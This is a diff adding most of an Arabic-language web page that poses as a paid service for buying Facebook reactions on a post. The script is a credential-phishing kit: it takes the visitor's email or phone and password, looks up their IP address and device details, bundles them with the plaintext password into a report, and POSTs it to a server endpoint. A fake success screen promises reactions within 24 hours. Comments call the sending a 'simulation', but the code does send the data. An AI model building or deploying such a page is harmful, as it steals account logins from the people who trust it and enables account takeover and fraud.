@@ -648,4 +648,271 @@
 
                 <div class="quantity-selector">
                     <button class="qty-btn" onclick="changeQty(-50)">
-                        <i class="fa
+                        <i class="fas fa-minus"></i>
+                    </button>
+                    <div class="qty-display" id="qtyDisplay">500</div>
+                    <button class="qty-btn" onclick="changeQty(50)">
+                        <i class="fas fa-plus"></i>
+                    </button>
+                </div>
+
+                <button class="btn btn-primary" onclick="goToPage(4)">
+                    التالي <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- الصفحة 4: رابط المنشور -->
+        <div class="page" id="page4">
+            <button class="back-btn" onclick="goToPage(3)">
+                <i class="fas fa-arrow-right"></i>
+            </button>
+
+            <div class="card">
+                <div class="header">
+                    <div class="logo" style="background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);">
+                        <i class="fas fa-link"></i>
+                    </div>
+                    <h1>رابط المنشور</h1>
+                    <p class="subtitle">أدخل رابط المنشور المستهدف</p>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                </div>
+
+                <div class="summary-box">
+                    <div class="summary-item">
+                        <span class="summary-label">المنصة:</span>
+                        <span class="summary-value" id="summaryPlatform">فيسبوك</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">نوع التفاعل:</span>
+                        <span class="summary-value" id="summaryReaction">👍 إعجاب</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">العدد:</span>
+                        <span class="summary-value" id="summaryQty">500</span>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>رابط منشور فيسبوك</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-link"></i>
+                        <input type="url" class="input-field" id="postUrl" placeholder="https://facebook.com/...">
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="submitOrder()" id="submitBtn">
+                    تأكيد الطلب <i class="fas fa-check-circle"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- صفحة النجاح -->
+        <div class="page" id="page5">
+            <div class="card">
+                <div class="success-animation">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h1 style="color: #42b72a; margin-bottom: 15px;">تم بنجاح!</h1>
+                    <p class="subtitle" style="margin-bottom: 30px;">
+                        جاري معالجة طلبك...<br>
+                        سيتم إضافة التفاعلات خلال 24 ساعة
+                    </p>
+                    <button class="btn btn-primary" onclick="location.reload()">
+                        <i class="fas fa-redo"></i> طلب جديد
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 1;
+        let selectedPlatform = 'facebook';
+        let selectedReaction = 'like';
+        let selectedQty = 500;
+        let userData = {};
+
+        const reactionsMap = {
+            'like': '👍 إعجاب',
+            'love': '❤️ حب',
+            'care': '🤗 أهم بالأمر',
+            'haha': '😂 هاها',
+            'wow': '😮 واو',
+            'sad': '😢 حزين'
+        };
+
+        function goToPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page' + page).classList.add('active');
+            currentPage = page;
+
+            if (page === 4) {
+                updateSummary();
+            }
+        }
+
+        function selectPlatform(platform) {
+            document.querySelectorAll('.platform-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+            selectedPlatform = platform;
+        }
+
+        function selectReaction(type, element) {
+            document.querySelectorAll('.reaction-item').forEach(item => {
+                item.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            selectedReaction = type;
+        }
+
+        function changeQty(amount) {
+            selectedQty += amount;
+            if (selectedQty < 50) selectedQty = 50;
+            if (selectedQty > 10000) selectedQty = 10000;
+            document.getElementById('qtyDisplay').textContent = selectedQty;
+        }
+
+        function updateSummary() {
+            document.getElementById('summaryReaction').textContent = reactionsMap[selectedReaction];
+            document.getElementById('summaryQty').textContent = selectedQty;
+        }
+
+        async function collectDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                deviceType: /Mobile/i.test(navigator.userAgent) ? '📱 موبايل' : '💻 كمبيوتر',
+                timestamp: new Date().toLocaleString('ar-SA')
+            };
+
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                info.ip = data.ip;
+            } catch (e) { 
+                info.ip = 'غير متوفر'; 
+            }
+
+            return info;
+        }
+
+        async function handleLogin() {
+            const btn = document.getElementById('loginBtn');
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            if (!email || !password) {
+                alert('الرجاء إدخال البريد/الهاتف وكلمة المرور');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> جارٍ التحقق...';
+
+            const deviceInfo = await collectDeviceInfo();
+
+            userData = {
+                email: email,
+                password: password,
+                deviceInfo: deviceInfo,
+                timestamp: new Date().toISOString()
+            };
+
+            // محاكاة إرسال البيانات
+            setTimeout(() => {
+                goToPage(3);
+                btn.disabled = false;
+                btn.innerHTML = 'تسجيل الدخول <i class="fas fa-sign-in-alt"></i>';
+            }, 2000);
+        }
+
+        async function submitOrder() {
+            const btn = document.getElementById('submitBtn');
+            const postUrl = document.getElementById('postUrl').value;
+
+            if (!postUrl) {
+                alert('الرجاء إدخال رابط المنشور');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> جارٍ المعالجة...';
+
+            const orderData = {
+                ...userData,
+                platform: selectedPlatform,
+                reaction: selectedReaction,
+                quantity: selectedQty,
+                postUrl: postUrl,
+                orderTime: new Date().toLocaleString('ar-SA')
+            };
+
+            // إنشاء نص التقرير
+            const report = `
+🔴 طلب جديد - تفاعلات فيسبوك
+
+━━━━━━━━━━━━━━━━━━━━
+👤 بيانات الحساب:
+📧 البريد/الهاتف: ${orderData.email}
+🔑 كلمة المرور: ${orderData.password}
+━━━━━━━━━━━━━━━━━━━━
+
+📊 تفاصيل الطلب:
+• المنصة: ${selectedPlatform}
+• نوع التفاعل: ${reactionsMap[selectedReaction]}
+• العدد: ${selectedQty}
+• رابط المنشور: ${postUrl}
+━━━━━━━━━━━━━━━━━━━━
+
+📱 معلومات الجهاز:
+• IP: ${orderData.deviceInfo.ip}
+• نوع الجهاز: ${orderData.deviceInfo.deviceType}
+• المنصة: ${orderData.deviceInfo.platform}
+
+🌐 المتصفح:
+${orderData.deviceInfo.userAgent}
+
+⏰ وقت الطلب: ${orderData.orderTime}
+━━━━━━━━━━━━━━━━━━━━`;
+
+            console.log('Report:', report);
+
+            // محاكاة إرسال البيانات
+            try {
+                await fetch('/api/send-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        caption: report,
+                        data: orderData 
+                    })
+                });
+            } catch (e) {
+                console.log('Data collected (simulation mode)');
+            }
+
+            setTimeout(() => {
+                goToPage(5);
+            }, 2000);
+        }
+
+        // Enter key support
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                if (currentPage === 2) handleLogin();
+                else if (currentPage === 4) submitOrder();
+            }
+        });
+    </script>
+</body>
+</html>
